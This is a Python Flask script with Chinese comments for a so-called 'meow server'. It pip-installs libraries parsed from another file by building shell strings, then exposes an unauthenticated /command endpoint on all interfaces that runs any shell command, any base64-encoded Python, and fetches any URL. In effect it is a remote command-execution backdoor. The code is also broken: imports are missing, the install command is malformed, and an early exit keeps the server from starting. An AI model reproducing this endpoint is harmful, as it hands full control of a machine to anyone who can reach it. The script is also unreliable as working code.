import subprocess
import ast
import re
import sys
import socket
from flask import Flask

def extract_libraries_with_versions(script_content):
    tree = ast.parse(script_content)
    libraries = {}

    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            for alias in node.names:
                library_name = alias.name
                version_comment = None

                if node.lineno < len(script_content.split('\n')):  # 检查是否有行注释
                    line = script_content.split('\n')[node.lineno - 1]
                    match = re.search(r'#\s*版本\s*:\s*(\S+)', line)  # 修改正则表达式
                    if match:
                        version_comment = match.group(1)

                libraries[library_name] = version_comment

    return libraries

app = Flask(__name__)

# 获取本机IP地址
ip_address = socket.gethostbyname(socket.gethostname())

# 为Flask指定实际端口
port = 5000

# 设置变量，用于判断是否执行额外的脚本
run_extra_script = 1  # 设置为1时执行，设置为其他值时不执行

if run_extra_script == 1:
    # 解析 1.py 文件，获取导入的库及其版本
    with open('1.py', 'r') as script_file:
        script_content = script_file.read()
        libraries_with_versions = extract_libraries_with_versions(script_content)

        if libraries_with_versions:
            print(f'找到导入的库及其版本：{libraries_with_versions}')

            # 尝试安装指定版本或最新版本
            for library, version in libraries_with_versions.items():
                install_command = [f'pip install {library}']
                if version:
                    install_command.append(f'=={version}')
                
                try:
                    subprocess.check_output(install_command, shell=True, text=True, stderr=subprocess.STDOUT)
                    print(f'成功安装 {library} 的版本 {version or "最新版"}')
                except subprocess.CalledProcessError as e:
                    print(f'安装 {library} 的版本 {version or "最新版"} 时出错：\n{e.output}')
                    sys.exit(1)
        else:
            print('未找到导入的库及其版本')

            # 没有找到版本信息，尝试安装最新版本
            try:
                subprocess.check_output(['pip', 'install', '-r', 'requirements.txt'], text=True, stderr=subprocess.STDOUT)
                print('成功安装最新版依赖')
            except subprocess.CalledProcessError as e:
                print(f'安装最新版依赖时出错：\n{e.output}')
                sys.exit(1)

    sys.exit()  # 执行完 1.py 后自动退出程序

print(f'喵~服务器IP地址是：{ip_address}，程序运行端口是：{port}')

# ... （以下为原有的路由和处理逻辑）
@app.route('/')
def home():
    return '欢迎来到喵~服务器'

@app.route('/command', methods=['POST'])
def receive_command():
    data = request.get_json()
    command = data.get('cmd')

    if command.startswith("py"):
        script_base64 = command[2:]
        decoded_script = base64.b64decode(script_base64).decode('utf-8')

        try:
            result = subprocess.check_output(['python3', '-c', decoded_script], text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

    elif command.startswith("ip"):
        url = command[2:]
        try:
            response = requests.get(url)
            return f'对方服务器IP：{response.text}'
        except requests.RequestException as e:
            return f'获取对方服务器IP时出错：{str(e)}'

    else:
        try:
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
